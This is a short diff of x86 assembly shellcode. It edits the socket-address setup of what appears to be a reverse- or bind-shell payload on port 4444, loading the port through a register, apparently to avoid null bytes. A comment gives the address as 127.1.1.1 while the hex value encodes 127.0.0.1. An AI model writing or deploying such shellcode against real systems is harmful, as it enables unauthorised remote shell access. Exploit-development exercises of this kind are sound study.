@@ -232,10 +232,15 @@ main:
 	mov al, 0x66
 
     ;4444
-    ;mov ebp , 0x0100007f  ;sin_addr=127.1.1.1 (network byte order)
+   ; mov ebp , 0x0100007f  ;sin_addr=127.1.1.1 (network byte order)
     push ebp ; Pushing our saved IP.
+
+  xor ecx, ecx 
+
+  mov cx , 0x5c11  ; ;push word 0x5c11 ;sin_port=4444 (network byte order)
+  push cx
 	 
-	push word 0x5c11 ;sin_port=4444 (network byte order)
+	
 	inc ebx          
 	push word bx     ;sin_family=AF_INET (0x2)
 	mov ecx, esp     ;save pointer to sockaddr struct
